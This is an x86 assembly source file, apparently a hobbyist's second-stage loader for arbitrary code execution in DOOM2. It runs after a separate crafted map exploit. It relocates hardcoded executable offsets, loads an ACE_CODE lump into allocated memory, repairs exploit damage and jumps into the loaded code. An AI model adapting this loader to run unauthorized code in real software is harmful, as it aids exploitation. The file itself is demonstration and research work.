// kgsws' DOOM2 code execution
// - this code is running from memory block allocated by cached STKEYS2 lump
// - this source only contains payload, you still need exploited map
// Loaders purpose is
// - free everything it can
// - allocate memory for the code and copy it
// - allocate memory for .bss and clear it
// - run the code

.section .text
.globl _start

_start:
	// %edx = 0x00075204 (state 13969)

	// get _start address
	mov	12(%edx),%esi
	sub	$0x1000,%esi	// compensate for VMA offset

	// get DATA base
	sub	$0x75204,%edx
	push	%edx

	// get CODE base
	mov	0x15A50(%edx),%eax	// state 1, action 'A_Light0'
	sub	$0x2DB40,%eax

	// relocate CODE references
	lea	reloc_code_start(%esi),%ebx
	lea	reloc_code_end(%esi),%edx
	call	do_reloc

	// relocate DATA references
	pop	%eax
	lea	reloc_data_start(%esi),%ebx
	lea	reloc_data_end(%esi),%edx
	call	do_reloc

	// get ACE_CODE lump
	lea	ace_code(%esi),%eax
	call	*W_CheckNumForName(%esi)
	test	%eax,%eax
	jl	ace_code_error

	// get lumpinfo base
	push	%eax	// backup lumpnum
	lea	0x0(,%eax,4),%edx
	add	%edx,%eax
	lea	0x0(,%eax,4),%edi	// EDI will point to ACE_CODE lump info
	mov	lumpinfo(%esi),%edx
	add	(%edx),%edi

	// get ACE_END lump
	lea	ace_end(%esi),%eax
	call	*W_CheckNumForName(%esi)
	test	%eax,%eax
	jl	ace_code_error
	mov	(%esp),%ebx
	sub	%ebx,%eax
	jl	ace_code_error

	// disable lumps between ACE_CODE and ACE_END
	mov	%edi,%ebx
dis_loop:
	// change first character in name
	movb	$0xCC,(%ebx)
	add	$20,%ebx
	dec	%eax
	jnz	dis_loop

	// check lump size
	mov	16(%edi),%eax	// ->size
	test	%eax,%eax
	jnz	do_load

ace_code_error:
	lea	error_text(%esi),%eax
	push	%eax
	call	*I_Error(%esi)

do_load:
	// read .bss size
	mov	8(%edi),%eax	// ->handle
	mov	12(%edi),%edx	// ->position
	xor	%ebx,%ebx	// SEEK_SET
	call	*lseek(%esi)
	mov	8(%edi),%eax	// ->handle
	lea	lumpinfo(%esi),%edx
	mov	$4,%ebx
	call	*read(%esi)

	// allocate memory for payload and its .bss
	mov	lumpinfo(%esi),%eax // .bss size
	add	16(%edi),%eax	// + lump size
	add	$32, %eax	// + padding
	call	*doom_malloc(%esi)
	test	%eax,%eax
	jz	ace_code_error

	// read ACE_CODE lump
	mov	%eax,%edx
	pop	%eax	// restore lumpnum
	push	%edx	// backup code pointer
	call	*W_ReadLump(%esi)

	// fix what map exploit broke
	mov	fixaddr(%esi),%eax
	movl	$868,(%eax)

	// reload 'STKEYS2'
	lea	stkeys_name(%esi),%eax
	mov	$1,%edx
	call	*W_CacheLumpName(%esi)
	mov	stkeys2(%esi),%edx
	mov	%eax,(%edx)

	// pass relocation info
	mov	_code_base(%esi),%ebx
	mov	_data_base(%esi),%ecx

	// restore code pointer
	pop	%eax

	// move stack pointer
	add	$0x50,%esp

	// run the code
	add	$4,%eax
	jmp	*%eax

// relocate the section
// %eax - section base
// %ebx - reloc start
// %edx - reloc end
do_reloc:
	cmp	%edx,%ebx
	jge	do_reloc_end
	add	%eax,(%ebx)
	add	$4,%ebx
	jmp	do_reloc
do_reloc_end:
	ret

//
// strings
ace_code:
	.string "ACE_CODE"
ace_end:
	.string "ACE_END"
stkeys_name:
	.string "STKEYS2"
error_text:
	.string "-= kgsws' DOOM in DOOM =-\nSomething is broken."

//
// tables

// pointers to the CODE section
// everything here has to be called indirectly
reloc_code_start:
//
_code_base:
	.4byte	0
I_Error:
	.4byte	0x0001AB10
doom_malloc:
	.4byte	0x00040602
W_CheckNumForName:
	.4byte	0x00038AF0
W_CacheLumpName:
	.4byte	0x00038CF0
W_ReadLump:
	.4byte	0x00038BF0
lseek:
	.4byte	0x000408c0
read:
	.4byte	0x00040935
//
reloc_code_end:

// pointers to the DATA section
// everything here has to be addressed indirectly
reloc_data_start:
//
_data_base:
	.4byte	0
lumpinfo:
	.4byte	0x00074FA4
fixaddr:
	.4byte	0x0001b944
stkeys2:
	.4byte	0x00075210
//
reloc_data_end:

// padding
	.4byte 0x7773676b
loader_end:


